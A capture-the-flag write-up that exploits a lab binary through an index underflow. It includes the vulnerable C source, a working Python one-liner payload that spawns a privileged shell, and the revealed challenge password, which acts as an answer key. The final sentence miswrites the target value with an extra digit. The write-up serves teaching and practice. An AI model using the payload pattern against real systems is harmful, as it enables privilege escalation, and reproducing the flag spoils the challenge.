# ELF x86 - Stack buffer overflow basic 3

Simple stack smash using an integer underrun to overwrite a stack variable

```c
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

void shell(void);

int main()
{

  char buffer[64];
  int check;
  int i = 0;
  int count = 0;

  printf("Enter your name: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 64)
        printf("Oh no...Sorry !\n");
      if(check == 0xbffffabc)
        shell();
      else
        {
            read(fileno(stdin),&i,1);
            switch(i)
            {
                case '\n':
                  printf("\a");
                  break;
                case 0x08:
                  count--;
                  printf("\b");
                  break;
                case 0x04:
                  printf("\t");
                  count++;
                  break;
                case 0x90:
                  printf("\a");
                  count++;
                  break;
                default:
                  buffer[count] = i;
                  count++;
                  break;
            }
        }
    }
}

void shell(void)
{
  setreuid(geteuid(), geteuid());
  system("/bin/bash");
}
```

When `check == 0xbffffabc` the program calls `shell()`. `count` cannot exceed `64`, but that doesn't matter because the stack looks like this:

| ========= MEMORY =========                             |
| ------------------------------------------------------ |
| buffer\[\]                                   \[64\]    |
| check                                        \[4\]     |
| i                                                \[4\] |
| count                                        \[4\]     |

So I don't need to overflow `buffer`, I need to underflow it. This is easy, since when the program encounters `\x08` it decrements the counter that is used to index into `buffer`:

```c
case 0x08:
  count--;
  printf("\b");
  break;
```

Thus:

```bash
app-systeme-ch16@challenge02:~$ (python -c "print '\x08' * 4 + '\xbc\xfa\xff\xbf'"; cat) | ./ch16
Enter your name:
whoami
app-systeme-ch16-cracked
cat .passwd
Sm4shM3ify0uC4n
```

This triggers an integer underflow on `count`, moving the pointer 4 bytes behind `buffer`, which is where `check` lives. After that, I write `0xbfffffabc` and get the shell.